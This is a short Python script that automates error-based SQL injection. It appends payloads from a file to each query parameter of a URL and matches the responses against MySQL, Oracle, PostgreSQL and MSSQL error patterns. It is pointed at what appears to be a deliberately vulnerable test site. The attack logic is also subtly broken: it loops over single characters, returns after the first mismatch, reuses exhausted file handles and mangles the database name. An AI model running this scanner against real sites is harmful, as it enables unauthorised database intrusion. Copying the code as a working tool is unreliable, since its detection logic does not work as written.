import requests
from urllib.parse import urlparse
import re

Mysql_Errors = open('MySQL_Error.txt', 'r')
Oracle_Errors = open('Oracle_Error.txt', 'r')
PostgreSQL_Errors = open('PostgreSQL_Error.txt', 'r')
MS_Errors = open('MsSQL_Error.txt', 'r')

DB_errors = [Mysql_Errors, Oracle_Errors, PostgreSQL_Errors, MS_Errors]


def exploit_sqli(url, payload, param):
    param += payload
    injection_url = urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path + "?" + param
    response = requests.get(injection_url)
    for i in range(len(DB_errors)):
        for DB in DB_errors[i]:
            for massage in DB:
                massage = massage.strip()
                pattern = re.compile(massage)
                if pattern.search(response.text):
                    print("[+] Exploit DB is {}".format(DB_errors[i].name.strip("_Error.txt")))
                    return True
                else:
                    return False


def sample_Get_inj(url):
    url = url
    params = urlparse(url).query.split("&")
    print("[-] Test Error based injection")
    for param in params:
        print("[-] Test Parameter {}".format(param))
        with open('Error-based-payloads.txt', 'r') as payload_list:
            for payload in payload_list:
                payload = payload.strip()
                if exploit_sqli(url, payload, param):
                    print("[+] SQL injection is Founded, using payload: {} ".format(payload))
                    break


sample_Get_inj("http://testphp.vulnweb.com/artists.php?artist=1")
